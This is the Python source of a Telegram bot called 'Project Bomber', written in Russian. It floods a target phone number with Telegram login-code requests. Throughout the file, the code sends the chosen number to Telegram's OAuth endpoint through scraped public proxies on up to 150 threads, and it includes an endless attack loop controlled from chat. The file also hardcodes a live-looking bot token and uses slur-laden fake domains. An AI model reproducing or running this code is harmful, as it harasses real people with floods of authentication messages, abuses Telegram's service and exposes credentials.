import telebot
import requests
import random
import re
import threading
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telebot import types
import urllib3

# Отключаем предупреждения
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

API_TOKEN = '8532710432:AAH_fZvLkcqwRMXErPQVZaRsfQCy2nDlPqk'
bot = telebot.TeleBot(API_TOKEN, parse_mode="Markdown")

# Список авторизованных пользователей
authorized_users = set()
SECRET_KEY = "яблоко"

MODES = [
    {"bot_id": "8532710432", "origin": "https://amir.gey", "name": "🏳️‍🌈 AMIR-GEY"},
    {"bot_id": "8377656958", "origin": "https://gey.amir", "name": "🦄 GEY-AMIR"},
    {"bot_id": "7884704764", "origin": "https://porno.hub", "name": "🔞 PORNO-HUB"}
]

user_data = {}
active_tasks = {}

def get_welcome_text():
    return (
        "┏━━━━━━━━━━━━━━━━━━━┓\n"
        "┃    🌐 Project Bomber ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━┛\n\n"
        "💬 Статус: Boomber\n"
        "📡 Версия: 5.9 (Auth Edition)\n"
        "────────────────────\n"
        "⌨️ **ВВОДИ НОМЕР ТЕЛЕФОНА:**"
    )

def get_proxies():
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000"
        r = requests.get(url, timeout=3)
        return [p.strip() for p in r.text.strip().split('\n') if ":" in p]
    except: return []

def get_country(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=1).json()
        return r.get('country', 'Unknown')
    except: return "Unknown"

def send_request(phone, proxy, mode_idx, chat_id, silent=False):
    config = MODES[mode_idx]
    payload = {"bot_id": config['bot_id'], "phone": phone, "origin": config['origin'], "request_access": "write"}
    try:
        r = requests.post("https://oauth.telegram.org/auth/request", data=payload, 
                         proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, 
                         timeout=3, verify=False)
        if r.status_code == 200 and not silent:
            ip_only = proxy.split(':')[0]
            def report():
                country = get_country(ip_only)
                bot.send_message(chat_id, f"🛠 `{datetime.now().strftime('%H:%M:%S')}`\n📡 {config['name']}\n🚀 Успешно: 1 запросов\nip-{ip_only} от прокси\nстрана {country}")
            threading.Thread(target=report).start()
        return True
    except: return False

# --- ПРОВЕРКА КЛЮЧА ---
@bot.message_handler(commands=['start'])
def handle_start(message):
    cid = message.chat.id
    if cid in authorized_users:
        bot.send_message(cid, get_welcome_text())
        bot.register_next_step_handler(message, get_phone)
    else:
        bot.send_message(cid, "⚠️ **ДОСТУП ОГРАНИЧЕН**\nВведите ключ доступа:")
        bot.register_next_step_handler(message, check_auth_key)

def check_auth_key(message):
    cid = message.chat.id
    if message.text == SECRET_KEY:
        authorized_users.add(cid)
        bot.send_message(cid, "✅ **КЛЮЧ ВЕРЕН**")
        bot.send_message(cid, get_welcome_text())
        bot.register_next_step_handler(message, get_phone)
    else:
        bot.send_message(cid, "❌ **КЛЮЧ НЕВЕРЕН**\nПользование ботом запрещено. Введите ключ еще раз:")
        bot.register_next_step_handler(message, check_auth_key)

# --- ЛОГИКА АТАК ---
def turbo_attack(chat_id, phone, mode_idx, silent=False):
    proxies = get_proxies()
    if not proxies: return
    with ThreadPoolExecutor(max_workers=100) as executor:
        for p in proxies[:60]: executor.submit(send_request, phone, p, mode_idx, chat_id, silent)

def besk_loop(chat_id, phone):
    while active_tasks.get(chat_id):
        proxies = get_proxies()
        if not proxies: continue
        with ThreadPoolExecutor(max_workers=150) as executor:
            for i in range(len(MODES)):
                for p in random.sample(proxies, min(len(proxies), 20)):
                    executor.submit(send_request, phone, p, i, chat_id, True)
        time.sleep(0.1)

# --- ВСЕ ОСТАЛЬНОЕ ---
@bot.message_handler(func=lambda m: m.text.lower() == "домен")
def cmd_domain(message):
    if message.chat.id not in authorized_users: return
    text = "⚙️ **Выбери номер режима:**\n"
    for i, m in enumerate(MODES): text += f"{i+1}. {m['name']} (`{m['origin']}`)\n"
    bot.send_message(message.chat.id, text + "\nОтправь цифру (1, 2, 3):")
    bot.register_next_step_handler(message, select_mode_step)

def select_mode_step(message):
    try:
        idx = int(message.text) - 1
        bot.send_message(message.chat.id, f"📝 Введи домен для {MODES[idx]['name']}:")
        bot.register_next_step_handler(message, lambda m: update_domain_final(m, idx))
    except: bot.send_message(message.chat.id, "❌ Цифру!")

def update_domain_final(message, idx):
    MODES[idx]['origin'] = message.text
    bot.send_message(message.chat.id, "✅ Ок")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    active_tasks[message.chat.id] = False
    bot.send_message(message.chat.id, "🛑 **СТОП**")

def get_phone(message):
    cid = message.chat.id
    if message.text.lower() == "домен":
        cmd_domain(message); return
    num = re.sub(r'\D', '', message.text)
    user_data[cid] = '+' + (num if not num.startswith('8') else '7' + num[1:])
    inline = types.InlineKeyboardMarkup(row_width=2)
    inline.add(types.InlineKeyboardButton("🚀 ЗАЛП", callback_data="m_z"),
               types.InlineKeyboardButton("🔥 ВСЕ", callback_data="m_a"),
               types.InlineKeyboardButton("♾ БЕСК", callback_data="m_b"),
               types.InlineKeyboardButton("⚙️ CUSTOM", callback_data="m_c"))
    reply = types.ReplyKeyboardMarkup(resize_keyboard=True)
    reply.add("🚀 ЗАЛП", "🔥 ВСЕ СРАЗУ", "♾ БЕСКОНЕЧНО", "⚙️ CUSTOM")
    bot.send_message(cid, f"📍 **ЦЕЛЬ:** `{user_data[cid]}`", reply_markup=reply)
    bot.send_message(cid, "Меню:", reply_markup=inline)

@bot.callback_query_handler(func=lambda call: True)
def cb(call):
    if call.message.chat.id not in authorized_users: return
    bot.answer_callback_query(call.id)
    execute(call.message.chat.id, call.data.replace("m_", ""))

def execute(cid, mode):
    phone = user_data.get(cid)
    if not phone: return
    if mode == "z": threading.Thread(target=turbo_attack, args=(cid, phone, 0), daemon=True).start()
    elif mode == "a":
        for i in range(len(MODES)): threading.Thread(target=turbo_attack, args=(cid, phone, i), daemon=True).start()
    elif mode == "b":
        active_tasks[cid] = True
        bot.send_message(cid, "♾ **TURBO-БЕСКОНЕЧНОСТЬ**")
        threading.Thread(target=besk_loop, args=(cid, phone), daemon=True).start()
    elif mode == "c": threading.Thread(target=turbo_attack, args=(cid, phone, 2), daemon=True).start()

@bot.message_handler(func=lambda m: True)
def txt(message):
    if message.chat.id not in authorized_users: return
    t = message.text.lower()
    if "залп" in t: execute(message.chat.id, "z")
    elif "все" in t: execute(message.chat.id, "a")
    elif "беск" in t: execute(message.chat.id, "b")
    elif "custom" in t: execute(message.chat.id, "c")

if __name__ == "__main__":
    bot.infinity_polling()
      
